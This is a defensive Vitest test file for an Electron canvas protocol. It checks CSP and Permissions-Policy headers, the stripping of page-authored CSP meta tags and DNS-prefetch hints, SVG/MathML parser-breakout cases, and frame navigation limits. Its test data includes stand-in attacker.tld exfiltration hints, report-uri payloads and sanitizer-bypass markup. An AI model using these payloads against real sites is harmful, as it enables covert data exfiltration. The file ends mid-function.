// Canvas content egress + frame confinement (adversarial review, 2026-08-15).
//
// `connect-src 'self'` governs FETCHES. These pin the three channels that are
// not fetches (WebRTC, a page-authored CSP `report-uri`, powerful features) and
// the main-process backstop on frame navigation, which `will-navigate` — a
// MAIN-FRAME-ONLY event — never covered.
//
// Everything here drives real behaviour: a served Response, or the listener the
// installer actually registered. Nothing asserts on source text.

import { describe, it, expect, beforeEach, afterAll, vi } from 'vitest'
import * as fs from 'fs'
import * as path from 'path'
import type { CanvasFrameNavigationDetails } from '../../../src/main/canvas/ccc-ux-protocol'

vi.mock('../../../src/main/ipc/setup-handlers', () => {
  const nodeFs = require('node:fs') as typeof import('node:fs')
  const nodeOs = require('node:os') as typeof import('node:os')
  const nodePath = require('node:path') as typeof import('node:path')
  const dir = nodeFs.mkdtempSync(nodePath.join(nodeOs.tmpdir(), 'ccc-ux-egress-'))
  return { getResourcesDirectory: () => dir }
})

const { getResourcesDirectory } = await import('../../../src/main/ipc/setup-handlers')
const store = await import('../../../src/main/canvas/canvas-store')
const {
  handleCccUxRequest,
  sanitizeServedHtml,
  isCanvasFrameNavigationAllowed,
  installCanvasFrameNavigationGuard,
  installCanvasPermissionGuard,
} = await import('../../../src/main/canvas/ccc-ux-protocol')

// The oracle for every scanner case below. jsdom parses with parse5 — the
// WHATWG tokenizer Chromium also implements — so the assertions compare the
// scanner against A REAL PARSER rather than against someone's reading of the
// spec, which is how the first scanner shipped disagreeing with the browser in
// both directions. jsdom ships no type declarations and tests are not in a
// tsconfig, so the import is deliberately untyped.
const { JSDOM } = (await import('jsdom')) as any

const SID = 'e9e9e9e9e9e9e9e9e9e9e9e9'

function get(url: string): Promise<Response> {
  return handleCccUxRequest(new Request(url))
}

/** Render a design version whose document is `html`; return its served body. */
async function serveDesign(html: string): Promise<{ body: string; res: Response }> {
  const { canvasId } = store.renderVersion(SID, { mode: 'design', html })
  const res = await get(`ccc-ux://${canvasId}/v1/index.html`)
  return { body: await res.text(), res }
}

beforeEach(() => {
  store._resetCanvasStoreForTest()
  fs.rmSync(path.join(getResourcesDirectory(), 'canvas'), { recursive: true, force: true })
})

afterAll(() => {
  try {
    fs.rmSync(getResourcesDirectory(), { recursive: true, force: true })
  } catch {
    /* best-effort temp cleanup */
  }
})

// ---------------------------------------------------------------------------
// Channel 1: WebRTC
// ---------------------------------------------------------------------------

describe('served CSP blocks WebRTC', () => {
  // An RTCPeerConnection with an attacker-supplied TURN server does DNS + UDP
  // during ICE gathering, carrying whatever the page put in `username`. No
  // fetch-directive covers it and Chromium's default is allow, so the CSP3
  // `webrtc` directive is the only thing that can refuse it.
  it('carries webrtc \'block\' on a design document', async () => {
    const { res } = await serveDesign('<!doctype html><html><head></head><body>x</body></html>')
    const directives = (res.headers.get('Content-Security-Policy') ?? '').split(';').map((d) => d.trim())
    expect(directives).toContain("webrtc 'block'")
  })

  it('carries webrtc \'block\' on a UAT document too', async () => {
    const dist = fs.mkdtempSync(path.join(getResourcesDirectory(), 'dist-'))
    fs.writeFileSync(path.join(dist, 'index.html'), '<!doctype html><html><body>u</body></html>')
    expect(store.registerCanvasUatRoot(SID, dist)).toBe(true)
    const { canvasId } = store.renderVersion(SID, { mode: 'uat', distRoot: dist })
    const res = await get(`ccc-ux://${canvasId}/v1/index.html`)
    const directives = (res.headers.get('Content-Security-Policy') ?? '').split(';').map((d) => d.trim())
    expect(directives).toContain("webrtc 'block'")
  })
})

// ---------------------------------------------------------------------------
// Channel 2 (partial): powerful features
// ---------------------------------------------------------------------------

describe('served Permissions-Policy denies powerful features', () => {
  it('denies camera/microphone/geolocation to every origin on a document', async () => {
    const { res } = await serveDesign('<!doctype html><html><body>x</body></html>')
    const policy = res.headers.get('Permissions-Policy') ?? ''
    for (const feature of ['camera', 'microphone', 'geolocation', 'display-capture', 'midi', 'usb']) {
      expect(policy.split(',').map((f) => f.trim())).toContain(`${feature}=()`)
    }
  })

  it('sends it on the bridge script response as well — the header is unconditional', async () => {
    const { canvasId } = store.renderVersion(SID, { mode: 'design', html: '<html><body>x</body></html>' })
    const res = await get(`ccc-ux://${canvasId}/__ccc__/canvas-bridge.js`)
    expect(res.status).toBe(200)
    expect(res.headers.get('Permissions-Policy') ?? '').toContain('camera=()')
  })
})

// ---------------------------------------------------------------------------
// Channel 3: a page-authored CSP report endpoint
// ---------------------------------------------------------------------------

describe('page-authored <meta http-equiv="Content-Security-Policy"> is removed at serve time', () => {
  const REPORT = 'default-src \'none\'; report-uri https://attacker.tld/x'

  it('removes the element from the served document', async () => {
    const { body } = await serveDesign(
      `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${REPORT}"></head><body>hi</body></html>`,
    )
    expect(body).not.toContain('attacker.tld')
    expect(body).not.toMatch(/http-equiv/i)
    expect(body).toContain('hi') // the rest of the document is untouched
  })

  it('removes the report-only spelling, which is the one that only reports', () => {
    const out = sanitizeServedHtml(
      `<head><meta http-equiv="Content-Security-Policy-Report-Only" content="${REPORT}"></head>`,
    )
    expect(out).toBe('<head></head>')
  })

  it('is not dodged by a character reference in the http-equiv value', () => {
    // The tokenizer decodes references in attribute VALUES, so a comparison on
    // the raw text is one `&#x53;` away from being bypassed.
    const out = sanitizeServedHtml(
      `<head><meta http-equiv="Content-&#x53;ecurity-Policy" content="${REPORT}"></head>`,
    )
    expect(out).not.toContain('attacker.tld')
  })

  it('is not dodged by an unquoted value, odd spacing, or a > inside a quoted value', () => {
    expect(sanitizeServedHtml("<meta http-equiv=content-security-policy content='default-src *'>")).toBe('')
    expect(sanitizeServedHtml('<meta\n  HTTP-EQUIV = "  content-security-policy  "\n  content="x">')).toBe('')
    // `>` inside the quoted value: a `[^>]*>` scanner stops early and leaves the
    // pragma standing.
    const withGt = '<meta http-equiv="content-security-policy" content="default-src \'none\'; report-uri https://a.tld/?x=>y">'
    expect(sanitizeServedHtml(withGt)).not.toContain('http-equiv')
  })

  it('leaves other metas, and text that merely LOOKS like one, alone', () => {
    // Over-stripping is a real cost: rewriting the characters inside a script
    // string corrupts working dist output.
    const doc =
      '<head><meta charset="utf-8"><meta name="viewport" content="width=device-width">' +
      '<script>var s = "<meta http-equiv=\'content-security-policy\' content=\'x\'>"</script>' +
      '<!-- <meta http-equiv="content-security-policy" content="x"> --></head>'
    expect(sanitizeServedHtml(doc)).toBe(doc)
  })
})

// ---------------------------------------------------------------------------
// The scanner vs. the parser (adversarial review, 2026-08-16, finding #1)
// ---------------------------------------------------------------------------
//
// A scanner that decides where a TAG is has exactly one correctness standard:
// the tokenizer. The first one here disagreed with it in both directions, so
// every case below is stated as a differential — jsdom (parse5) says whether
// the element exists, and the scanner has to agree.
//
// What is measured is ELEMENT EXISTENCE, which is what the scanner claims to
// act on. Whether a pragma in a given POSITION also takes effect (Chromium only
// honours a head child, and a meta policy can only intersect the served header
// either way) is the engine's business and is not what these assert.

/** How many live `<meta http-equiv=…CSP…>` elements a spec parser builds. */
function livePragmaCount(html: string): number {
  const { window } = new JSDOM(html)
  return [...window.document.querySelectorAll('meta[http-equiv]')].filter((meta: any) =>
    /^content-security-policy(-report-only)?$/i.test((meta.getAttribute('http-equiv') ?? '').trim()),
  ).length
}

const HINT_RELS = new Set(['dns-prefetch', 'preconnect', 'prefetch', 'prerender'])

/**
 * How many LIVE resource hints a spec parser builds.
 *
 * `relList` is the whole test: an HTML `<link>` has one, and an SVG/MathML
 * `link` — which is what `<svg><link rel=dns-prefetch>` builds — does not,
 * because it is a foreign element that happens to be spelled like a hint and
 * resolves nothing. Counting tag names instead would call an inert one live.
 */
function liveHintCount(html: string): number {
  const { window } = new JSDOM(html)
  return [...window.document.getElementsByTagName('link')].filter(
    (link: any) => link.relList && [...link.relList].some((rel: string) => HINT_RELS.has(rel.toLowerCase())),
  ).length
}

/** What a spec parser's DOMTokenList makes of the first `<link>`'s rel. */
function relListOf(html: string): string[] {
  const { window } = new JSDOM(html)
  const link: any = window.document.getElementsByTagName('link')[0]
  return link?.relList ? [...link.relList] : []
}

const ATTACK = (id: string) => `default-src 'none'; report-uri https://attacker.tld/${id}`

/** Documents where the parser builds the element and the old scanner walked
 *  past it — every one measured returning its input UNCHANGED. */
const PARSER_SAYS_LIVE: Array<{ name: string; html: string }> = [
  {
    name: '`<!-->` is an abrupt-closing-of-empty-comment, not an open comment',
    html: `<!--><meta http-equiv="content-security-policy" content="${ATTACK('a')}">`,
  },
  {
    name: '`<!--->` closes just as abruptly',
    html: `<!---><meta http-equiv="content-security-policy" content="${ATTACK('b')}">`,
  },
  {
    name: '`--!>` closes a comment, and nothing later says `-->`',
    html: `<!-- hidden --!><meta http-equiv="content-security-policy" content="${ATTACK('c')}">`,
  },
  {
    name: '`<!--` inside a PRIOR tag\'s attribute value opens nothing',
    html: `<div title="<!--"></div><meta http-equiv="content-security-policy" content="${ATTACK('d')}">`,
  },
  {
    name: 'a duplicate http-equiv: the parser keeps the FIRST, `Map.set` kept the LAST',
    html: `<meta http-equiv="content-security-policy" http-equiv="charset" content="${ATTACK('e')}">`,
  },
  {
    name: '`</scriptx>` is not an end tag, so the script has not ended there',
    // The desync this measures: a scanner that accepts `</scriptx>` as the end
    // tag resumes INSIDE the script, meets `<!--` there, and swallows the rest
    // of the document — including this pragma. (The trailing `>` matters:
    // without it the bogus end tag runs on to the real `</script>` and the two
    // scanners happen to land in the same place, so the case would prove
    // nothing.)
    html:
      '<script>var a = "</scriptx>"; var b = "<!-- never closed";</script>' +
      `<meta http-equiv="content-security-policy" content="${ATTACK('f')}">`,
  },
]

/** Documents where the parser builds NO element — the bytes are inert text, and
 *  deleting them silently edits the page's own content. */
const PARSER_SAYS_INERT: Array<{ name: string; html: string }> = [
  {
    name: '<textarea> content is RCDATA — the meta is text the user reads',
    html: '<textarea>example: <meta http-equiv="content-security-policy" content="x"> end</textarea>',
  },
  {
    name: '<title> content is RCDATA too',
    html: '<title>docs for <meta http-equiv="content-security-policy" content="x"></title>',
  },
  {
    name: '<template> content is a fragment that is not in a document',
    html: '<template><meta http-equiv="content-security-policy" content="x"><p>row</p></template>',
  },
  {
    name: 'nested templates still end at the right depth',
    html: '<template><template><meta http-equiv="content-security-policy" content="x"></template></template>',
  },
  {
    name: 'an attribute value that contains a whole tag',
    html: '<div data-x="<meta http-equiv=content-security-policy content=z>">row</div>',
  },
  {
    name: 'the same `</scriptx>` desync, seen from the corruption side',
    // Resuming inside the script does not only miss things — it also finds
    // meta-shaped TEXT in a JavaScript string and splices it out, which is how
    // a scanner breaks a working bundle.
    html: '<script>var a = "</scriptx>"; var m = "<meta http-equiv=content-security-policy content=x>";</script>',
  },
]

describe('the CSP-meta scan agrees with the HTML parser', () => {
  for (const { name, html } of PARSER_SAYS_LIVE) {
    it(`removes a pragma the parser makes LIVE: ${name}`, () => {
      expect(livePragmaCount(html), 'case no longer produces a live element').toBe(1)
      expect(sanitizeServedHtml(html)).not.toContain('attacker.tld')
      expect(livePragmaCount(sanitizeServedHtml(html))).toBe(0)
    })
  }

  for (const { name, html } of PARSER_SAYS_INERT) {
    it(`leaves a pragma the parser makes INERT byte-identical: ${name}`, () => {
      expect(livePragmaCount(html), 'case is not actually inert').toBe(0)
      expect(sanitizeServedHtml(html)).toBe(html)
    })
  }

  it('agrees on a real dist document — this repo\'s own built renderer html', () => {
    // The reason the scan was fixed rather than replaced by "refuse any document
    // carrying a CSP meta": a CSP meta is ORDINARY in shipped output. This is
    // the shape of `src/renderer/index.html`, which is what `npm run build`
    // emits into out/renderer and what a UAT render of this very app would load.
    const dist =
      '<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8" />\n' +
      '    <!--\n      Keep byte-identical to CSP_POLICY in src/shared/csp-policy.ts.\n    -->\n' +
      '    <meta http-equiv="Content-Security-Policy" content="default-src \'self\'" />\n' +
      '    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n' +
      '    <title>AI Code Conductor</title>\n    <style>\n      body { margin: 0 }\n    </style>\n' +
      '  </head>\n  <body>\n    <div id="root"></div>\n' +
      '    <script type="module" src="./main.tsx"></script>\n  </body>\n</html>'
    expect(livePragmaCount(dist)).toBe(1)
    const out = sanitizeServedHtml(dist)
    expect(livePragmaCount(out)).toBe(0)
    // …and nothing ELSE moved: the document still renders.
    expect(out).toContain('<meta charset="UTF-8" />')
    expect(out).toContain('<title>AI Code Conductor</title>')
    expect(out).toContain('<div id="root"></div>')
    expect(out).toContain('src="./main.tsx"')
  })
})

// ---------------------------------------------------------------------------
// Channel 4: resource hints (adversarial review, 2026-08-16, finding #2)
// ---------------------------------------------------------------------------
//
// `<link rel=dns-prefetch href="//<base32-chunk>.attacker.tld">` is a DNS query
// per chunk, answered by the attacker's own authoritative resolver. No CSP
// directive covers a hint, and the two mitigations the source used to claim for
// it did not exist: Permissions-Policy has no feature for resource hints, and
// "only reachable through a UAT root the user registered" is false — the design
// path below registers NO root and serves agent-authored html.

describe('resource hints cannot carry data out', () => {
  it('sends X-DNS-Prefetch-Control: off on a document, a UAT document and the bridge', async () => {
    // The header is the half that also reaches a hint the page's own script
    // creates. NOTE what this does NOT prove: that Chromium honours it, or how
    // far it reaches (dns-prefetch vs. the preconnect predictor). That is a
    // property of the running engine — jsdom has no network stack — and needs a
    // real-Chromium confirmation.
    const { res } = await serveDesign('<!doctype html><html><body>x</body></html>')
    expect(res.headers.get('X-DNS-Prefetch-Control')).toBe('off')

    const dist = fs.mkdtempSync(path.join(getResourcesDirectory(), 'dist-hints-'))
    fs.writeFileSync(path.join(dist, 'index.html'), '<!doctype html><html><body>u</body></html>')
    expect(store.registerCanvasUatRoot(SID, dist)).toBe(true)
    const { canvasId } = store.renderVersion(SID, { mode: 'uat', distRoot: dist })
    expect((await get(`ccc-ux://${canvasId}/v1/index.html`)).headers.get('X-DNS-Prefetch-Control')).toBe('off')
    expect((await get(`ccc-ux://${canvasId}/__ccc__/canvas-bridge.js`)).headers.get('X-DNS-Prefetch-Control')).toBe(
      'off',
    )
  })

  it('strips the hint links out of an agent-authored DESIGN document — no UAT root involved', async () => {
    // Exactly the path the old comment said could not be reached: renderVersion
    // in design mode, serving from the version's own directory, nothing
    // registered. `captureHeadless` mounts a document like this with no UI.
    const { body } = await serveDesign(
      '<!doctype html><html><head>' +
        '<link rel="dns-prefetch" href="//mfrgg2lo.attacker.tld">' +
        '<link rel="preconnect" href="//nbswy3dp.attacker.tld">' +
        '<link rel="prefetch" href="//obqxg43f.attacker.tld">' +
        '<link rel="prerender" href="//pb2ha4dm.attacker.tld">' +
        '</head><body>hi</body></html>',
    )
    expect(body).not.toContain('attacker.tld')
    expect(body).not.toMatch(/dns-prefetch|preconnect|prerender/i)
    expect(body).toContain('hi')
  })

  it('is not dodged by case or by a character reference in rel', () => {
    expect(sanitizeServedHtml('<link REL="DNS-Prefetch" href="//x.attacker.tld">')).toBe('')
    expect(sanitizeServedHtml('<link rel="&#100;ns-prefetch" href="//x.attacker.tld">')).toBe('')
    expect(sanitizeServedHtml("<link rel=preconnect href='//x.attacker.tld'>")).toBe('')
  })

  it('leaves every other link alone — a dist page still gets its stylesheets', () => {
    const doc =
      '<link rel="stylesheet" href="/assets/app.css">' +
      '<link rel="icon" href="/favicon.ico">' +
      '<link rel="modulepreload" href="/assets/chunk.js">' +
      '<link rel="canonical" href="https://example.com/">'
    expect(sanitizeServedHtml(doc)).toBe(doc)
  })

  it('drops only the hint token from a mixed rel, keeping the element that does real work', () => {
    // Removing the whole element here would take the stylesheet with it, which
    // is the over-strip mistake in a different costume.
    expect(sanitizeServedHtml('<link rel="stylesheet dns-prefetch" href="/assets/app.css">')).toBe(
      '<link rel="stylesheet" href="/assets/app.css">',
    )
  })

  // Finding #2 of the 2026-08-16 re-attack, measured: the value was SPLIT on
  // literal whitespace in the raw text and each piece CLASSIFIED after decoding,
  // so a character-reference separator made one opaque token that decoded to
  // contain a hint — nothing was left to keep and the whole element went, taking
  // the page's own stylesheet with it. That is over-strip of the USER's html.
  it('splits rel on the DECODED value, so a &#32; separator cannot take the stylesheet down with it', () => {
    expect(sanitizeServedHtml('<link rel="stylesheet&#32;dns-prefetch" href="/assets/app.css">')).toBe(
      '<link rel="stylesheet" href="/assets/app.css">',
    )
    // A tab reference, and one on the other side of the hint.
    expect(sanitizeServedHtml('<link rel="stylesheet&#9;preconnect" href="/a.css">')).toBe(
      '<link rel="stylesheet" href="/a.css">',
    )
    expect(sanitizeServedHtml('<link rel="prefetch&#32;icon" href="/favicon.ico">')).toBe(
      '<link rel="icon" href="/favicon.ico">',
    )
  })

  it('agrees with the parser about what those tokens ARE, before and after', () => {
    const before = '<link rel="stylesheet&#32;dns-prefetch" href="/assets/app.css">'
    expect(relListOf(before), 'case no longer decodes to two tokens').toEqual(['stylesheet', 'dns-prefetch'])
    expect(relListOf(sanitizeServedHtml(before))).toEqual(['stylesheet'])
  })

  it('writes kept tokens back as RAW spans, so a quote reference cannot escape the attribute', () => {
    // The property the raw-span writeback exists for: the decoded token holds a
    // quote and an attribute that would be REAL markup if it were written back
    // decoded. It has to come out as the reference it went in as.
    const hostile = '<link rel="stylesheet&#34; onload=&#34;boom dns-prefetch" href="/a.css">'
    const out = sanitizeServedHtml(hostile)
    expect(out).toContain('&#34;')
    const { window } = new JSDOM(out)
    const links = [...window.document.getElementsByTagName('link')]
    expect(links).toHaveLength(1)
    expect(links[0].hasAttribute('onload'), 'the rewrite injected an attribute').toBe(false)
    expect([...links[0].relList]).toEqual(['stylesheet"', 'onload="boom'])
  })

  it('still removes the element when every decoded token is a hint', () => {
    expect(sanitizeServedHtml('<link rel="dns-prefetch&#32;preconnect" href="//x.attacker.tld">')).toBe('')
  })

  it('does not touch hint-shaped TEXT, same as the pragma scan', () => {
    const doc = '<textarea><link rel="dns-prefetch" href="//x.tld"></textarea>'
    expect(sanitizeServedHtml(doc)).toBe(doc)
  })
})

// ---------------------------------------------------------------------------
// Foreign content: SVG / MathML (adversarial re-attack, 2026-08-16, finding #1)
// ---------------------------------------------------------------------------
//
// Inside `<svg>`/`<math>`, `style`/`script`/`textarea`/`xmp`/`iframe`/`noembed`
// and `title` are ordinary foreign elements whose children are MARKUP. The
// scanner treated those names as RAWTEXT/RCDATA everywhere, which is wrong in
// both directions — and the under-strip direction turned out not to be the
// inert one the finding expected: a `<meta>` inside foreign content BREAKS OUT,
// so everything after it is HTML again and the `<link rel=dns-prefetch>`
// elements that follow are live hints the strip never saw.

describe('the scan knows where HTML stops and SVG/MathML begins', () => {
  it('strips the hint links a breakout smuggles past a rawtext skip — a WORKING channel', () => {
    // The payload: the walker skips `<svg><style>` … `</style>` as rawtext, but
    // `<meta>` pops the parser out of foreign content, so every link after it
    // is an HTML `<link>` with a working relList — one DNS query per chunk at
    // the attacker's own resolver, none of them stripped.
    const html =
      '<svg><style><meta>' +
      '<link rel="dns-prefetch" href="//mfrgg2lo.attacker.tld">' +
      '<link rel="dns-prefetch" href="//nbswy3dp.attacker.tld">' +
      '</style></svg>'
    expect(liveHintCount(html), 'case no longer produces live hints').toBe(2)
    const out = sanitizeServedHtml(html)
    expect(liveHintCount(out)).toBe(0)
    expect(out).not.toContain('attacker.tld')
  })

  it('strips a pragma the same skip hid, in every element that loses its content model', () => {
    for (const wrap of ['style', 'script', 'textarea', 'xmp', 'iframe', 'noembed']) {
      const html = `<svg><${wrap}><meta http-equiv="content-security-policy" content="${ATTACK(wrap)}"></${wrap}></svg>`
      expect(livePragmaCount(html), `${wrap}: case is not actually live`).toBe(1)
      expect(livePragmaCount(sanitizeServedHtml(html)), wrap).toBe(0)
    }
    // Position note, not a claim this test proves: the survivor always lands in
    // <body> (an <svg> can never be a head child), and Chromium only honours a
    // CSP <meta> that IS a head child — so the PRAGMA half of this was inert.
    // The hint half above is not, which is why the fix is code and not a note.
  })

  it('leaves an SVG-namespace <link> alone — it is not a hint, it is foreign markup', () => {
    // The over-strip half of the same finding: `link` does not break out, so
    // this is an SVG element with no relList and no resolution, and deleting it
    // edited the page's own drawing.
    const html = '<svg><link rel="dns-prefetch" href="//a.tld"></svg>'
    expect(liveHintCount(html), 'case is not actually inert').toBe(0)
    expect(sanitizeServedHtml(html)).toBe(html)
  })

  it('strips inside an HTML integration point, where HTML parsing resumes', () => {
    // `<svg><title>` is NOT RCDATA — it is an integration point, and a link
    // under it is a live HTML hint. This was a documented residual that
    // measurement showed to be a live one.
    const html = '<svg><title><link rel="dns-prefetch" href="//t.attacker.tld"></title></svg>'
    expect(liveHintCount(html), 'case no longer produces a live hint').toBe(1)
    expect(liveHintCount(sanitizeServedHtml(html))).toBe(0)
  })

  it('goes back to skipping RAWTEXT inside an integration point — the other direction', () => {
    // Inside <foreignObject>/<desc> HTML rules apply again, so <style> IS
    // rawtext again and the pragma in it is TEXT. Suspending the skip for the
    // whole subtree would corrupt this.
    const html = '<svg><foreignObject><style><meta http-equiv="content-security-policy" content="x"></style></foreignObject></svg>'
    expect(livePragmaCount(html), 'case is not actually inert').toBe(0)
    expect(sanitizeServedHtml(html)).toBe(html)
  })
})

describe('the foreign-content model, measured against the parser case by case', () => {
  // Every context below places the same payloads somewhere that decides whether
  // they are markup at all. The assertion is the scanner's whole contract, in
  // both directions at once: nothing the parser makes LIVE may survive, and
  // anything it makes INERT must come back byte-identical.
  const CONTEXTS: Array<{ name: string; wrap: (payload: string) => string }> = [
    { name: 'plain HTML (the control)', wrap: (p) => `<head>${p}</head>` },
    { name: 'svg > style', wrap: (p) => `<svg><style>${p}</style></svg>` },
    { name: 'svg > script', wrap: (p) => `<svg><script>${p}</script></svg>` },
    { name: 'svg > textarea', wrap: (p) => `<svg><textarea>${p}</textarea></svg>` },
    { name: 'svg > xmp', wrap: (p) => `<svg><xmp>${p}</xmp></svg>` },
    { name: 'svg > iframe', wrap: (p) => `<svg><iframe>${p}</iframe></svg>` },
    { name: 'svg > noembed', wrap: (p) => `<svg><noembed>${p}</noembed></svg>` },
    { name: 'svg (direct child)', wrap: (p) => `<svg>${p}</svg>` },
    { name: 'svg > g', wrap: (p) => `<svg><g>${p}</g></svg>` },
    { name: 'svg > title (HTML integration point)', wrap: (p) => `<svg><title>${p}</title></svg>` },
    { name: 'svg > desc > style (HTML again, so RAWTEXT again)', wrap: (p) => `<svg><desc><style>${p}</style></desc></svg>` },
    { name: 'svg > foreignObject', wrap: (p) => `<svg><foreignObject>${p}</foreignObject></svg>` },
    { name: 'svg > foreignObject > style', wrap: (p) => `<svg><foreignObject><style>${p}</style></foreignObject></svg>` },
    { name: 'svg > foreignObject > svg > style (foreign again)', wrap: (p) => `<svg><foreignObject><svg><style>${p}</style></svg></foreignObject></svg>` },
    { name: 'math > ms > style (MathML text integration point)', wrap: (p) => `<math><ms><style>${p}</style></ms></math>` },
    { name: 'math > mtext', wrap: (p) => `<math><mtext>${p}</mtext></math>` },
    { name: 'math > annotation-xml[encoding=text/html] > style', wrap: (p) => `<math><annotation-xml encoding="text/html"><style>${p}</style></annotation-xml></math>` },
    { name: 'math > annotation-xml (no encoding) > style', wrap: (p) => `<math><annotation-xml><style>${p}</style></annotation-xml></math>` },
    { name: 'math > mi (a MathML link is inert too)', wrap: (p) => `<math><mi>${p}</mi></math>` },
    { name: 'self-closing <svg/> opens nothing', wrap: (p) => `<svg/>${p}` },
    { name: 'svg > style, after a <br> breakout', wrap: (p) => `<svg><style><br>${p}</style></svg>` },
    { name: 'svg > style, after a <font color> breakout', wrap: (p) => `<svg><style><font color="red">${p}</style></svg>` },
    { name: 'svg > style, after a <font> that does NOT break out', wrap: (p) => `<svg><style><font>${p}</style></svg>` },
    { name: 'svg > style, after a </p> exit', wrap: (p) => `<svg><style></p>${p}</style></svg>` },
    { name: 'svg > style, after a </br> exit', wrap: (p) => `<svg><style></br>${p}</style></svg>` },
    { name: 'svg > style, after an unmatched </div> (which does NOT exit)', wrap: (p) => `<svg><style></div>${p}</style></svg>` },
    { name: 'svg > style, after </svg>', wrap: (p) => `<svg><style></svg>${p}` },
    { name: 'svg > CDATA', wrap: (p) => `<svg><![CDATA[${p}]]></svg>` },
    { name: 'svg > style > CDATA', wrap: (p) => `<svg><style><![CDATA[${p}]]></style></svg>` },
    { name: 'template (an inert fragment)', wrap: (p) => `<template>${p}</template>` },
    { name: 'template > svg > style', wrap: (p) => `<template><svg><style>${p}</style></svg></template>` },
    { name: 'uppercase SVG > STYLE', wrap: (p) => `<SVG><STYLE>${p}</STYLE></SVG>` },
    { name: 'svg > style inside a real <script> (still rawtext, HTML content)', wrap: (p) => `<script>var s = "<svg><style>${p}</style></svg>"</script>` },
  ]

  const PAYLOADS: Array<{ name: string; html: string }> = [
    { name: 'a hint link', html: '<link rel="dns-prefetch" href="//c1.attacker.tld">' },
    { name: 'a CSP pragma', html: '<meta http-equiv="content-security-policy" content="default-src \'none\'">' },
    { name: 'a breakout meta then a hint link', html: '<meta><link rel="preconnect" href="//c2.attacker.tld">' },
    { name: 'a mixed rel', html: '<link rel="stylesheet prefetch" href="/mixed.css">' },
    { name: 'a link that is nobody\'s business', html: '<link rel="stylesheet" href="/plain.css">' },
  ]

  // Appended in a SECOND document per case, never the first: it carries a live
  // hint of its own, and mixing it into the byte-identity check below would
  // make that check vacuous — no case would ever be "inert" again.
  const TAIL = '<link rel="stylesheet" href="/after.css"><link rel="prerender" href="//tail.attacker.tld"><p>tail</p>'

  for (const context of CONTEXTS) {
    for (const payload of PAYLOADS) {
      it(`${context.name} :: ${payload.name}`, () => {
        const html = context.wrap(payload.html)
        const out = sanitizeServedHtml(html)
        // 1. Nothing the parser calls live may survive, wherever it was hidden.
        expect(livePragmaCount(out), 'a live pragma survived').toBe(0)
        expect(liveHintCount(out), 'a live hint survived').toBe(0)
        // 2. …and nothing it calls inert may be touched. Deleting bytes a
        //    browser keeps is how a scanner silently breaks working output.
        if (livePragmaCount(html) === 0 && liveHintCount(html) === 0) {
          expect(out, 'over-strip: the parser makes this inert').toBe(html)
        }
        // 3. The walker came back out where the parser does: the tail is plain
        //    HTML content whatever the wrapper did to the walker's position, so
        //    its stylesheet stays and its hint goes. A desync shows up here.
        const tailed = sanitizeServedHtml(html + TAIL)
        expect(tailed, 'the tail stylesheet was corrupted').toContain('<link rel="stylesheet" href="/after.css">')
        expect(tailed, 'the tail hint survived').not.toContain('tail.attacker.tld')
        expect(tailed).toContain('<p>tail</p>')
      })
    }
  }
})

describe('<noscript> is rawtext in the canvas frame, which always has scripting', () => {
  // Finding #3 of the re-attack. The source used to justify VISITING inside
  // <noscript> as refusing to treat a live element as inert — backwards for
  // this deployment: both mount sites carry
  // `sandbox="allow-scripts allow-same-origin allow-forms"`, so the canvas
  // frame parses <noscript> content as RAWTEXT and never renders it, and the
  // scanner was editing text.
  //
  // NOTE THE ORACLE. jsdom's default parse has scripting DISABLED, which is the
  // OTHER parser; `runScripts: 'dangerously'` is the only setting that turns the
  // scripting flag on, so it is what the canvas frame's parse has to be
  // measured against. The payload below contains no script to run.
  const inNoscript = '<noscript><link rel="dns-prefetch" href="//n.tld"><meta http-equiv="content-security-policy" content="x"></noscript>'

  function countsWithScripting(html: string): { links: number; metas: number } {
    const { window } = new JSDOM(html, { runScripts: 'dangerously' })
    return {
      links: window.document.getElementsByTagName('link').length,
      metas: window.document.getElementsByTagName('meta').length,
    }
  }

  it('leaves it byte-identical, because a scripting-enabled parser builds nothing there', () => {
    const scripted = countsWithScripting(inNoscript)
    expect(scripted, 'the canvas frame would build elements here after all').toEqual({ links: 0, metas: 0 })
    expect(sanitizeServedHtml(inNoscript)).toBe(inNoscript)
  })

  it('is a DEPLOYMENT fact, and the residual is stated: scripting off would make that markup', () => {
    // The same document under the other parser — jsdom's default, scripting
    // off. This is the case the source comment now names as the residual: a
    // canvas frame mounted without scripting would have a live hint here that
    // is no longer stripped, and `X-DNS-Prefetch-Control: off` is what covers
    // it (that frame has no bridge either, so it is already broken).
    expect(liveHintCount(inNoscript)).toBe(1)
    expect(livePragmaCount(inNoscript)).toBe(1)
  })
})

// ---------------------------------------------------------------------------
// Frame navigation confinement
// ---------------------------------------------------------------------------

describe('a canvas frame may only navigate inside its own canvas+version', () => {
  const A = 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/index.html'

  it('allows the same version — reload and SPA routes still work', () => {
    expect(isCanvasFrameNavigationAllowed(A, A)).toBe(true)
    expect(isCanvasFrameNavigationAllowed(A, 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v1/about')).toBe(true)
  })

  it('refuses another canvas — the window.name cross-canvas theft primitive', () => {
    expect(isCanvasFrameNavigationAllowed(A, 'ccc-ux://bbbbbbbbbbbbbbbbbbbbbbbb/v1/index.html')).toBe(false)
  })

  it('refuses another VERSION of the same canvas — the snapshot version-confusion primitive', () => {
    expect(isCanvasFrameNavigationAllowed(A, 'ccc-ux://aaaaaaaaaaaaaaaaaaaaaaaa/v2/index.html')).toBe(false)
  })

  it('refuses leaving the scheme entirely, about:blank included', () => {
    expect(isCanvasFrameNavigationAllowed(A, 'https://attacker.tld/')).toBe(false)
    // about:blank is the stepping stone: reach it and the frame stops looking
    // like a canvas frame, so the next hop would be unguarded.
    expect(isCanvasFrameNavigationAllowed(A, 'about:blank')).toBe(false)
  })

  it('does not interfere with the initial mount from a non-canvas document', () => {
    expect(isCanvasFrameNavigationAllowed('about:blank', A)).toBe(true)
    // '' answers "not a canvas" here too — a true statement about the STRING.
    // It is no longer a decision about a navigation: the guard drops empty urls
    // before this point rather than treating one as an allowing source. See the
    // installCanvasFrameNavigationGuard cases below.
    expect(isCanvasFrameNavigationAllowed('', A)).toBe(true)
  })
})

describe('installCanvasFrameNavigationGuard', () => {
  function install(): (details: CanvasFrameNavigationDetails) => void {
    let listener: ((details: CanvasFrameNavigationDetails) => void) | null = null
